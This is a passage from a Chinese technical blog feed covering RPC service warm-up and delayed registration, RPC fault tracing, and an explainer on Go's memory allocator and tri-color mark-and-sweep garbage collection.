地址，然后每次发送请求前，都需要通过负载均衡算法从连接池中选择一个可用连接。那这样的话，我们是不是就可以让负载均衡在选择连接的时候，区分一下是否是刚启动不久的应用？对于刚启动的应用，我们可以让它被选择到的概率特别低，但这个概率会随着时间的推移慢慢变大，从而实现一个动态增加流量的过程。</p><p>当服务提供方运行时长小于预热时间时，对服务提供方进行降权，减少被负载均衡选择的概率，避免让应用在启动之初就处于高负载状态，从而实现服务提供方在启动后有一个预热的过程。</p><p><img src="https://static001.geekbang.org/resource/image/e7/d4/e796da8cf26f056479a59fd97b43d0d4.jpg?wh=2558*2523" alt="img"></p><p>​                                                                                                                   <strong>预热过程图</strong></p><p>启动预热更多是从调用方的角度出发，去解决服务提供方应用冷启动的问题，让调用方的请求量通过一个时间窗口过渡，慢慢达到一个正常水平，从而实现平滑上线。但对于服务提供方本身来说，有没有相关方案可以实现这种效果呢？</p><h5 id="延迟暴露"><a href="#延迟暴露" class="headerlink" title="延迟暴露"></a>延迟暴露</h5><p>举例：spring应用启动的时候都是通过 main 入口，然后顺序加载各种相关依赖的类。以 Spring 应用启动为例，在加载的过程中，Spring 容器会顺序加载 Spring Bean，如果某个 Bean 是 RPC 服务的话，我们不光要把它注册到 Spring-BeanFactory 里面去，还要把这个 Bean 对应的接口注册到注册中心。注册中心在收到新上线的服务提供方地址的时候，会把这个地址推送到调用方应用内存中；当调用方收到这个服务提供方地址的时候，就会去建立连接发请求。</p><p>但这时候可能存在服务提供方并没有启动完成的情况？因为服务提供方应用可能还在加载其它的 Bean。对于调用方来说，只要获取到了服务提供方的 IP，就有可能发起 RPC 调用，但如果这时候服务提供方没有启动完成的话，就会导致调用失败，从而使业务受损。</p><p>解决方案：</p><ul><li><p>在应用启动加载、解析 Bean 的时候，如果遇到了 RPC 服务的 Bean，只先把这个 Bean 注册到 Spring-BeanFactory 里面去，而并不把这个 Bean 对应的接口注册到注册中心，只有等应用启动完成后，才把接口注册到注册中心用于服务发现，从而实现让服务调用方延迟获取到服务提供方地址。这样是可以保证应用在启动完后才开始接入流量的，但其实这样做，我们还是没有实现最开始的目标。因为这时候应用虽然启动完成了，但并没有执行相关的业务代码，所以 JVM 内存里面还是冷的。如果这时候大量请求过来，还是会导致整个应用在高负载模式下运行，从而导致不能及时地返回请求结果。而且在实际业务中，一个服务的内部业务逻辑一般会依赖其它资源的，比如缓存数据。如果我们能在服务正式提供服务前，先完成缓存的初始化操作，而不是等请求来了之后才去加载，我们就可以降低重启后第一次请求出错的概率。</p></li><li><p>利用服务提供方把接口注册到注册中心的那段时间。我们可以在服务提供方应用启动后，接口注册到注册中心前，预留一个 Hook 过程，让用户可以实现可扩展的 Hook 逻辑。用户可以在 Hook 里面模拟调用逻辑，从而使 JVM 指令能够预热起来，并且用户也可以在 Hook 里面事先预加载一些资源，只有等所有的资源都加载完成后，最后才把接口注册到注册中心。整个应用启动过程如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/3c/bd/3c84f9cf6745f2d50e34bd8431c84abd.jpg?wh=3374*893" alt="img"></p></li></ul><p>​                                                                                                                <strong>启动顺序图</strong></p><h5 id="相关解释：-1"><a href="#相关解释：-1" class="headerlink" title="相关解释："></a>相关解释：</h5><p><img src="https://s2.loli.net/2022/08/28/HhWuQ9j2KxJ3Ayt.png" alt="image-20220723225147106.png"></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><img src="https://s2.loli.net/2022/08/28/FZ1Tlig6GQbLCvE.png" alt="image-20220724150651258.png"></p><p><img src="https://s2.loli.net/2022/08/28/tT46nkNsdzK9Vmw.png" alt="image-20220724150622961.png"></p><h4 id="分布式场景中如何做到快速定位RPC相关问题？"><a href="#分布式场景中如何做到快速定位RPC相关问题？" class="headerlink" title="分布式场景中如何做到快速定位RPC相关问题？"></a>分布式场景中如何做到快速定位RPC相关问题？</h4><p>在分布式的生产环境中，比如下面这个场景：我们搭建了一个分布式的应用系统，在这个应用系统中，我启动了 4 个子服务，分别是服务 A、服务 B、服务 C 与服务 D，而这 4 个服务的依赖关系是 A-&gt;B-&gt;C-&gt;D，而这些服务又都部署在不同的机器上。在 RPC 调用中，如果服务端的业务逻辑出现了异常，就会把异常抛回给调用端，那么如果现在这个调用链中有一个服务出现了异常，我们该如何定位问题呢？</p><h5 id="方法-1：借助合理封装的异常信息"><a href="#方法-1：借助合理封装的异常信息" class="headerlink" title="方法 1：借助合理封装的异常信息"></a>方法 1：借助合理封装的异常信息</h5><p><img src="https://static001.geekbang.org/resource/image/b8/1b/b8fee37688d39ae7913429f6cbc06f1b.jpg?wh=4498*1228" alt="img"></p><h5 id="方法-2：借助分布式链路跟踪"><a href="#方法-2：借助分布式链路跟踪" class="headerlink" title="方法 2：借助分布式链路跟踪"></a>方法 2：借助分布式链路跟踪</h5><p><img src="https://s2.loli.net/2022/08/28/ldO1BCDz3xqs7ay.png" alt="image-20220724163935463.png"></p><h4 id="流量回放"><a href="#流量回放" class="headerlink" title="流量回放"></a>流量回放</h4><p><img src="https://s2.loli.net/2022/08/28/Cq24cT78wnWaYRz.png" alt="image-20220724170611177.png"></p>]]></content>
    
    
    <categories>
      
      <category>RPC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>RPC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang内存分配和垃圾回收</title>
    <link href="/2022/08/27/Golang%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E5%92%8C%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/"/>
    <url>/2022/08/27/Golang%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E5%92%8C%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/</url>
    
    <content type="html"><![CDATA[ <meta name="referrer" content="no-referrer"># Golang内存管理和垃圾回收<p>现代高级编程语言管理内存的方式分自动和手动两种。手动管理内存的典型代表是C和C++，编写代码过程中需要主动申请或者释放内存；而PHP、Java 和Go等语言使用自动的内存管理系统，由内存分配器和垃圾收集器来代为分配和回收内存，其中垃圾收集器就是我们常说的GC。今天腾讯后台开发工程师汪汇向大家分享 Golang 垃圾回收算法。（当然，Rust 是另一种）</p><p>从Go v1.12版本开始，Go使用了<strong>非分代的、并发的、基于三色标记清除的垃圾回收器</strong>。相关标记清除算法可以参考C&#x2F;C++，而Go是一种静态类型的编译型语言。因此，Go不需要VM，Go应用程序二进制文件中嵌入了一个小型运行时(Go runtime)，可以处理诸如垃圾收集(GC)、调度和并发之类的语言功能。首先让我们看一下Go内部的内存管理是什么样子的。</p><h2 id="一、-Golang内存管理"><a href="#一、-Golang内存管理" class="headerlink" title="一、 Golang内存管理"></a><strong>一、 Golang内存管理</strong></h2><p>这里先简单介绍一下 Golang 运行调度。在 Golang 里面有三个基本的概念：G, M, P。</p><ul><li>G: Goroutine 执行的上下文环境。</li><li>M: 操作系统线程。</li><li>P: Processer。进程调度的关键，调度器，也可以认为约等于CPU。</li></ul><p>一个 Goroutine 的运行需要G+P+M三部分结合起来。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/VY8SELNGe94Cjxng5VbT4M7FkUgyAfhpQu2e0dr5z6Za2b2aIw9peb8icIQyc29bC7VNuYfPh81ibaUdoSJg6ibicw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p> 图源：《Golang—内存管理(内存分配)》</p><p>(<a href="http://t.zoukankan.com/zpcoding-p-13259943.html">http://t.zoukankan.com/zpcoding-p-13259943.html</a>)</p><h3 id="（一）TCMalloc"><a href="#（一）TCMalloc" class="headerlink" title="（一）TCMalloc"></a><strong>（一）TCMalloc</strong></h3><p>Go将内存划分和分组为页（Page），这和Java的内存结构完全不同，没有分代内存，这样的原因是Go的内存分配器采用了TCMalloc的<strong>设计思想</strong>：</p><h4 id="1-Page"><a href="#1-Page" class="headerlink" title="1.Page"></a><strong>1.Page</strong></h4><p>与TCMalloc中的Page相同，x64下1个Page的大小是8KB。上图的最下方，1个浅蓝色的长方形代表1个Page。</p><h4 id="2-Span"><a href="#2-Span" class="headerlink" title="2.Span"></a><strong>2.Span</strong></h4><p>与TCMalloc中的Span相同，Span是内存管理的基本单位，代码中为mspan，一组连续的Page组成1个Span，所以上图一组连续的浅蓝色长方形代表的是一组Page组成的1个Span，另外，1个淡紫色长方形为1个Span。</p><h4 id="3-mcache"><a href="#3-mcache" class="headerlink" title="3.mcache"></a><strong>3.mcache</strong></h4><p>mcache是提供给P（逻辑处理器）的高速缓存，用于存储小对象（对象大小&lt;&#x3D; 32Kb）。尽管这类似于线程堆栈，但它是堆的一部分，用于动态数据。所有类大小的mcache包含scan和noscan类型mspan。Goroutine可以从mcache没有任何锁的情况下获取内存，因为一次P只能有一个锁G。因此，这更有效。mcache从mcentral需要时请求新的span。</p><h4 id="4-mcentral"><a href="#4-mcentral" class="headerlink" title="4.mcentral"></a><strong>4.mcentral</strong></h4><p>mcentral与TCMalloc中的CentralCache类似，是所有线程共享的缓存，需要加锁访问，它按Span class对Span分类，串联成链表，当mcache的某个级别Span的内存被分配光时，它会向mcentral申请1个当前级别的Span。每个mcentral包含两个mspanList：</p><ul><li>empty：双向span链表，包括没有空闲对象的span或缓存mcache中的span。当此处的span被释放时，它将被移至non-empty span链表。</li><li>non-empty：有空闲对象的span双向链表。当从mcentral请求新的span，mcentral将从该链表中获取span并将其移入empty span链表。</li></ul><h4 id="5-mheap"><a href="#5-mheap" class="headerlink" title="5.mheap"></a><strong>5.mheap</strong></h4><p>mheap与TCMalloc中的PageHeap类似，它是堆内存的抽象，也是垃圾回收的重点区域，把从OS申请出的内存页组织成Span，并保存起来。当mcentral的Span不够用时会向mheap申请，mheap的Span不够用时会向OS申请，向OS的内存申请是按页来的，然后把申请来的内存页生成Span组织起来，同样也是需要加锁访问的。</p><h4 id="6-栈"><a href="#6-栈" class="headerlink" title="6.栈"></a><strong>6.栈</strong></h4><p>这是栈存储区，每个Goroutine（G）有一个栈。在这里存储了静态数据，包括函数栈帧，静态结构，原生类型值和指向动态结构的指针。这与分配给每个P的mcache不是一回事。</p><h3 id="7-TCMalloc为什么快："><a href="#7-TCMalloc为什么快：" class="headerlink" title="7.TCMalloc为什么快："></a>7.TCMalloc为什么快：</h3><p>1.使用了thread cache（线程cache），小块的内存分配都可以从cache中分配，这样再多线程分配内存的情况下，可以减少锁竞争。</p><p>2.tcmalloc会为每个线程分配本地缓存，小对象请求可以直接从本地缓存获取，如果没有空闲内存，则从central heap中一次性获取一连串小对象。大对象是直接使用页级分配器（page-level allocator）从Central page Heap中进行分配，即一个大对象总是按页对齐的。tcmalloc对于小内存，按8的整数次倍分配，对于大内存，按4K的整数次倍分配。</p><p>3.当某个线程缓存中所有对象的总大小超过2MB的时候，会进行垃圾收集。垃圾收集阈值会自动根据线程数量的增加而减少，这样就不会因为程序有大量线程而过度浪费内存。</p><p>4.tcmalloc为每个线程分配一个thread-local cache，小对象的分配直接从thread-local cache中分配。根据需要将对象从CentralHeap中移动到thread-local cache，同时定期的用垃圾回收器把内存从thread-local cache回收到Central free list中。</p><h3 id="8-总结"><a href="#8-总结" class="headerlink" title="8.总结"></a>8.总结</h3><p>ThreadCache（用于小对象分配）：线程本地缓存，每个线程独立维护一个该对象，多线程在并发申请内存时不会产生锁竞争。</p><p>CentralCache（Central free list，用于小对象分配）：全局cache，所有线程共享。当thread cache空闲链表为空时，会批量从CentralCache中申请内存；当thread cache总内存超过阈值，会进行内存垃圾回收，将空闲内存返还给CentralCache。</p><p>Page Heap（小&#x2F;大对象）：全局页堆，所有线程共享。对于小对象，当centralcache为空时，会从page heap中申请一个span；当一个span完全空闲时，会将该span返还给page heap。对于大对象，直接从page heap中分配，用完直接返还给page heap。系统内存：当page cache内存用光后，会通过sbrk、mmap等系统调用向OS申请内存。</p><h3 id="（二）内存分配"><a href="#（二）内存分配" class="headerlink" title="（二）内存分配"></a><strong>（二）内存分配</strong></h3><p>Go 中的内存分类并不像TCMalloc那样分成小、中、大对象，但是它的小对象里又细分了一个Tiny对象，Tiny对象指大小在1Byte到16Byte之间并且不包含指针的对象。小对象和大对象只用大小划定，无其他区分。</p><p><strong>核心思想</strong>：把内存分为多级管理，降低锁的粒度(只是去mcentral和mheap会申请锁), 以及多种对象大小类型，减少分配产生的内存碎片。</p><ul><li>*<em>*微小对象(Tiny)（size&lt;16B*</em>*<em>）*</em>*</li></ul><p>使用mcache的微小分配器分配小于16个字节的对象，并且在单个16字节块上可完成多个微小分配。</p><ul><li><em><strong>*小对象（尺寸16B〜32KB）*</strong></em></li></ul><p>大小在16个字节和32k字节之间的对象被分配在G运行所在的P的mcache的对应的mspan size class上。</p><ul><li><em><strong>*大对象（大小&gt;32KB）*</strong></em></li></ul><p>大于32 KB的对象直接分配在mheap的相应大小类上(size class)。</p><ul><li>如果mheap为空或没有足够大的页面满足分配请求，则它将从操作系统中分配一组新的页（至少1MB）。</li><li>如果对应的大小规格在mcache中没有可用的块，则向mcentral申请。</li><li>如果mcentral中没有可用的块，则向mheap申请，并根据BestFit 算法找到最合适的mspan。如果申请到的mspan超出申请大小，将会根据需求进行切分，以返回用户所需的页数。剩余的页构成一个新的mspan放回mheap的空闲列表。</li><li>如果mheap中没有可用span，则向操作系统申请一系列新的页（最小 1MB）。Go 会在操作系统分配超大的页（称作arena）。分配一大批页会减少和操作系统通信的成本。</li></ul><h3 id="（三）内存回收"><a href="#（三）内存回收" class="headerlink" title="（三）内存回收"></a><strong>（三）内存回收</strong></h3><p>go内存会分成堆区（Heap）和栈区（Stack）两个部分，程序在运行期间可以主动从堆区申请内存空间，这些内存由内存分配器分配并由垃圾收集器负责回收。栈区的内存由编译器自动进行分配和释放，栈区中存储着函数的参数以及局部变量，它们会随着函数的创建而创建，函数的返回而销毁。如果只申请和分配内存，内存终将枯竭。Go使用垃圾回收收集不再使用的span，把span释放交给mheap，mheap对span进行span的合并，把合并后的span加入scav树中，等待再分配内存时，由mheap进行内存再分配。<strong>因此，Go堆是Go垃圾收集器管理的主要区域</strong>。</p><h2 id="二、常见的GC算法"><a href="#二、常见的GC算法" class="headerlink" title="二、常见的GC算法"></a>二、常见的GC算法</h2><h3 id="引用计数法"><a href="#引用计数法" class="headerlink" title="引用计数法"></a>引用计数法</h3><p>根据对象自身的引用计数来回收，当引用计数归零时进行回收，但是计数频繁更新会带来更多开销，且无法解决循环引用的问题。</p><ul><li>优点：简单直接，回收速度快</li><li>缺点：需要额外的空间存放计数，无法处理循环引用的情况；</li></ul><h3 id="可达性分析"><a href="#可达性分析" class="headerlink" title="可达性分析"></a>可达性分析</h3><p>对象引用链：通过一系列的称为”GCRoots”的对象作为起始点，从这些节点开始向下搜索，搜索所走过的路径称为引用链(Reference Chain) ，如果一个对象到GCRoots没有任何引用链相连，或者用图论的话来说，就是，从GCRoots到这个对象不可达时，则证明此对象是不可用的。</p><p>根对象在垃圾回收的术语中又叫做根集合，它是垃圾回收器在标记过程时最先检查的对象，包括：</p><p>1.全局变量：程序在编译期就能确定的那些存在于程序整个生命周期的变量。</p><p>2.执行栈：每个 goroutine 都包含自己的执行栈，这些执行栈上包含栈上的变量及指向分配的堆内存区块的指针。</p><p>3.寄存器：寄存器的值可能表示一个指针，参与计算的这些指针可能指向某些赋值器分配的堆内存区块。<br><img src="https://img-blog.csdnimg.cn/20200801163955410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDA5MjYy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="标记清除法"><a href="#标记清除法" class="headerlink" title="标记清除法"></a>标记清除法</h3><p>标记出所有不需要回收的对象，在标记完成后统一回收掉所有未被标记的对象。<br><img src="https://liangyaopei.github.io/2021/01/02/golang-gc-intro/mark_clean.png" alt="mark_clean"></p><ul><li>优点：简单直接，速度快，适合可回收对象不多的场景</li><li>缺点：会造成不连续的内存空间（内存碎片），导致有大的对象创建的时候，明明内存中总内存是够的，但是空间不是连续的造成对象无法分配；</li></ul><h3 id="复制法"><a href="#复制法" class="headerlink" title="复制法"></a>复制法</h3><p>复制法将内存分为大小相同的两块，每次使用其中的一块，当这一块的内存使用完后，将还存活的对象复制到另一块去，然后再把使用的空间一次清理掉<br><img src="https://liangyaopei.github.io/2021/01/02/golang-gc-intro/copy_method.png" alt="copy_method"></p><ul><li>优点：解决了内存碎片的问题，每次清除针对的都是整块内存，但是因为移动对象需要耗费时间，效率低于标记清除法；</li><li>缺点：有部分内存总是利用不到，资源浪费，移动存活对象比较耗时，并且如果存活对象较多的时候，需要担保机制确保复制区有足够的空间可完成复制；</li></ul><h3 id="标记整理"><a href="#标记整理" class="headerlink" title="标记整理"></a>标记整理</h3><p>标记过程同标记清除法，结束后将存活对象压缩至一端，然后清除边界外的内容<br><img src="https://liangyaopei.github.io/2021/01/02/golang-gc-intro/mark_tidy.png" alt="mark_tidy"></p><ul><li>优点：解决了内存碎片的问题，也不像标记复制法那样需要担保机制，存活对象较多的场景也使适用；</li><li>缺点：性能低，因为在移动对象的时候不仅需要移动对象还要维护对象的引用地址，可能需要对内存经过几次扫描才能完成；</li></ul><h3 id="分代式"><a href="#分代式" class="headerlink" title="分代式"></a>分代式</h3><p>将对象根据存活时间的长短进行分类，存活时间小于某个值的为年轻代，存活时间大于某个值的为老年代，永远不会参与回收的对象为永久代。并根据分代假设（如果一个对象存活时间不长则倾向于被回收，如果一个对象已经存活很长时间则倾向于存活更长时间）对对象进行回收。</p><h3 id="Golang的垃圾回收（GC）算法"><a href="#Golang的垃圾回收（GC）算法" class="headerlink" title="Golang的垃圾回收（GC）算法"></a>Golang的垃圾回收（GC）算法</h3><p>Golang的垃圾回收（GC）算法使用的是无分代（对象没有代际之分）、<strong>不整理（回收过程中不对对象进行移动与整理）</strong>、<strong>并发（与用户代码并发执行）</strong>的三色标记清扫算法。原因在于：</p><ul><li><strong>对象整理的优势是解决内存碎片问题以及“允许”使用顺序内存分配器。但 Go 运行时的分配算法基于<code>tcmalloc</code>，基本上没有碎片问题。 并且顺序内存分配器在多线程的场景下并不适用。G</strong>o 使用的是基于<code>tcmalloc</code>的现代内存分配算法，对对象进行整理不会带来实质性的性能提升。</li><li>分代<code>GC</code>依赖分代假设，即<code>GC</code>将主要的回收目标放在新创建的对象上（存活时间短，更倾向于被回收），<strong>而非频繁检查所有对象。</strong></li><li>Go 的编译器会通过逃逸分析将大部分新生对象存储在栈上（栈直接被回收），只有那些需要长期存在的对象才会被分配到需要进行垃圾回收的堆中。也就是说，分代<code>GC</code>回收的那些存活时间短的对象在 Go 中是直接被分配到栈上，当<code>goroutine</code>死亡后栈也会被直接回收，不需要<code>GC</code>的参与，进而分代假设并没有带来直接优势。</li><li>Go 的垃圾回收器与用户代码<strong>并发执行</strong>，<strong>使得 STW 的时间与对象的代际、对象的 size 没有关系。</strong>Go 团队更关注于如何更好地让 GC 与用户代码并发执行（使用适当的 CPU 来执行垃圾回收），而非减少停顿时间这一单一目标上。</li></ul><h2 id="三、Go的垃圾回收"><a href="#三、Go的垃圾回收" class="headerlink" title="三、Go的垃圾回收"></a>三、Go的垃圾回收</h2><p>垃圾回收(Garbage Collection，简称GC)是编程语言中提供的自动的内存管理机制，自动释放不需要的内存对象，让出存储器资源。GC过程中无需程序员手动执行。GC机制在现代很多编程语言都支持，GC能力的性能与优劣也是不同语言之间对比度指标之一。</p><p>Golang在GC的演进过程中也经历了很多次变革，Go V1.3之前的标记-清除(mark and sweep)算法，Go V1.3之前的标记-清扫(mark and sweep)的缺点</p><ul><li>Go V1.5的三色并发标记法</li><li>Go V1.5的三色标记为什么需要STW</li><li>Go V1.5的三色标记为什么需要屏障机制(“强-弱” 三色不变式、插入屏障、删除屏障 )</li><li>Go V1.8混合写屏障机制</li><li>Go V1.8混合写屏障机制的全场景分析</li></ul><h3 id="（一）、Go-V1-3之前的标记-清除-mark-and-sweep-算法"><a href="#（一）、Go-V1-3之前的标记-清除-mark-and-sweep-算法" class="headerlink" title="（一）、Go V1.3之前的标记-清除(mark and sweep)算法"></a>（一）、Go V1.3之前的标记-清除(mark and sweep)算法</h3><p>在Golang1.3之前的时候主要用的普通的标记-清除算法，此算法主要有两个主要的步骤：</p><ul><li>标记(Mark phase)</li><li>清除(Sweep phase)</li></ul><h4 id="1-标记清除算法的具体步骤"><a href="#1-标记清除算法的具体步骤" class="headerlink" title="1 标记清除算法的具体步骤"></a>1 标记清除算法的具体步骤</h4><p><strong>第一步</strong>，暂停程序业务逻辑, 分类出可达和不可达的对象，然后做上标记。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26269664/1650787873045-d038fe47-4898-4b07-9e16-007bebb6fb9c.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_43,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p>图中表示是程序与对象的可达关系，目前程序的可达对象有对象1-2-3，对象4-7等五个对象。</p><p><strong>第二步</strong>, 开始标记，程序找出它所有可达的对象，并做上标记。如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/26269664/1650787891194-883ec541-5f13-4934-9274-080e5f44cf5e.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_44,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p>所以对象1-2-3、对象4-7等五个对象被做上标记。</p><p><strong>第三步</strong>,  标记完了之后，然后开始清除未标记的对象. 结果如下。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26269664/1650787913616-ecf21ee2-c247-4401-9d3e-5e2fa278726f.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_38,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p>操作非常简单，但是有一点需要额外注意：mark and sweep算法在执行的时候，需要程序暂停！即 <code>STW(stop the world)</code>，STW的过程中，CPU不执行用户代码，全部用于垃圾回收，这个过程的影响很大，所以STW也是一些回收机制最大的难题和希望优化的点。所以在执行第三步的这段时间，程序会暂定停止任何工作，卡在那等待回收执行完毕。</p><p><strong>第四步</strong>, 停止暂停，让程序继续跑。然后循环重复这个过程，直到process程序生命周期结束。</p><p>以上便是标记-清除（mark and sweep）回收的算法。</p><h4 id="2-标记-清除-mark-and-sweep-的缺点"><a href="#2-标记-清除-mark-and-sweep-的缺点" class="headerlink" title="2 标记-清除(mark and sweep)的缺点"></a>2 标记-清除(mark and sweep)的缺点</h4><p>标记清除算法明了，过程鲜明干脆，但是也有非常严重的问题。</p><ul><li>STW，stop the world；让程序暂停，程序出现卡顿 **(重要问题)**；</li><li>标记需要扫描整个heap；</li><li>清除数据会产生heap碎片。</li></ul><p>Go V1.3版本之前就是以上来实施的,  在执行GC的基本流程就是首先启动STW暂停，然后执行标记，再执行数据回收，最后停止STW，如图所示。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26269664/1650787936233-9002040d-220b-4af6-8e51-75d7887569b4.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_69,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p>从上图来看，全部的GC时间都是包裹在STW范围之内的，这样貌似程序暂停的时间过长，影响程序的运行性能。所以Go V1.3 做了简单的优化,将STW的步骤提前, 减少STW暂停的时间范围.如下所示</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26269664/1650788071197-26a29703-0fb5-43f4-afc5-87a35fc78a4b.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_69,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"><br>上图主要是将STW的步骤提前了一步，因为在Sweep清除的时候，可以不需要STW停止，因为这些对象已经是不可达对象了，不会出现回收写冲突等问题。</p><p>但是无论怎么优化，Go V1.3都面临这个一个重要问题，就是<strong>mark-and-sweep 算法会暂停整个程序</strong> 。</p><p>Go是如何面对并这个问题的呢？接下来G V1.5版本 就用<strong>三色并发标记法</strong>来优化这个问题.</p><h3 id="（二）、Go-V1-5的三色并发标记法"><a href="#（二）、Go-V1-5的三色并发标记法" class="headerlink" title="（二）、Go V1.5的三色并发标记法"></a>（二）、Go V1.5的三色并发标记法</h3><p>为了解决标记清除算法带来的STW问题，Go和Java都会实现三色可达性分析标记算法的变种以缩短STW的时间。三色可达性分析标记算法按“是否被访问过”将程序中的对象分成白色、黑色和灰色：</p><ul><li><strong>白色对象 — 对象尚未被垃圾收集器访问过，在可达性分析刚开始的阶段，所有的对象都是白色的，若在分析结束阶段，仍然是白色的对象，即代表不可达。</strong></li><li><strong>黑色对象 — 表示对象已经被垃圾收集器访问过，且这个对象的所有引用都已经被扫描过，黑色的对象代表已经被扫描过而且是安全存活的，如果有其他对象只想黑色对象无需再扫描一遍，黑色对象不可能直接（不经过灰色对象）指向某个白色对象。</strong></li><li><strong>灰色对象 — 表示对象已经被垃圾收集器访问过，但是这个对象上至少存在一个引用还没有被扫描过，因为存在指向白色对象的外部指针，垃圾收集器会扫描这些对象的子对象。</strong></li></ul><p>三色可达性分析算法大致的流程是（初始状态所有对象都是白色）：</p><p><strong>1.从GC Roots开始枚举，它们所有的直接引用变为灰色（移入灰色集合），GC Roots变为黑色。</strong></p><p><strong>2.从灰色集合中取出一个灰色对象进行分析：</strong></p><ul><li><strong>将这个对象所有的直接引用变为灰色，放入灰色集合中；</strong></li><li><strong>将这个对象变为黑色。</strong></li></ul><p><strong>3.重复步骤2，一直重复直到灰色集合为空。</strong></p><p><strong>4.分析完成，仍然是白色的对象就是GC Roots不可达的对象，可以作为垃圾被清理。</strong></p><p>Golang中的垃圾回收主要应用三色标记法，GC过程和其他用户goroutine可并发运行，但需要一定时间的<strong>STW(stop the world)<strong>，所谓</strong>三色标记法</strong>实际上就是通过三个阶段的标记来确定清楚的对象都有哪些？我们来看一下具体的过程。</p><p><strong>第一步</strong> , 每次新创建的对象，默认的颜色都是标记为“白色”，如图所示。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26269664/1651035738281-051f7a89-e07f-418c-ad0e-7cb94ef1a3b8.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_61,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p>上图所示，我们的程序可抵达的内存对象关系如左图所示，右边的标记表，是用来记录目前每个对象的标记颜色分类。这里面需要注意的是，所谓“程序”，则是一些对象的根节点集合。所以我们如果将“程序”展开，会得到类似如下的表现形式，如图所示。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651035821416-b0ad644e-ef8e-440a-bbf4-b9e24a7e0257.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p><strong>第二步</strong>, 每次GC回收开始, 会从根节点开始遍历所有对象，把遍历到的对象从白色集合放入“灰色”集合如图所示。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651035842467-7341846f-6dee-4f8b-ad37-dc9723aa6407.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"><br>这里 要注意的是，本次遍历是一次遍历，非递归形式，是从程序抽次可抵达的对象遍历一层，如上图所示，当前可抵达的对象是对象1和对象4，那么自然本轮遍历结束，对象1和对象4就会被标记为灰色，灰色标记表就会多出这两个对象。</p><p><strong>第三步</strong>, 遍历灰色集合，将灰色对象引用的对象从白色集合放入灰色集合，之后将此灰色对象放入黑色集合，如图所示。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651035859950-96053775-24f7-4bdc-a1fb-295747055b3e.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"><br>这一次遍历是只扫描灰色对象，将灰色对象的第一层遍历可抵达的对象由白色变为灰色，如：对象2、对象7. 而之前的灰色对象1和对象4则会被标记为黑色，同时由灰色标记表移动到黑色标记表中。</p><p><strong>第四步</strong>, 重复<strong>第三步</strong>, 直到灰色中无任何对象，如图所示。<br><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651035907012-927d6cbc-686b-4f81-a1de-097ac7598a8e.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"><br><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651035916208-9c293dc0-8988-4180-a9b7-412e2599af0e.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p>当我们全部的可达对象都遍历完后，灰色标记表将不再存在灰色对象，目前全部内存的数据只有两种颜色，黑色和白色。那么黑色对象就是我们程序逻辑可达（需要的）对象，这些数据是目前支撑程序正常业务运行的，是合法的有用数据，不可删除，白色的对象是全部不可达对象，目前程序逻辑并不依赖他们，那么白色对象就是内存中目前的垃圾数据，需要被清除。</p><p><strong>第五步</strong>: 回收所有的白色标记表的对象. 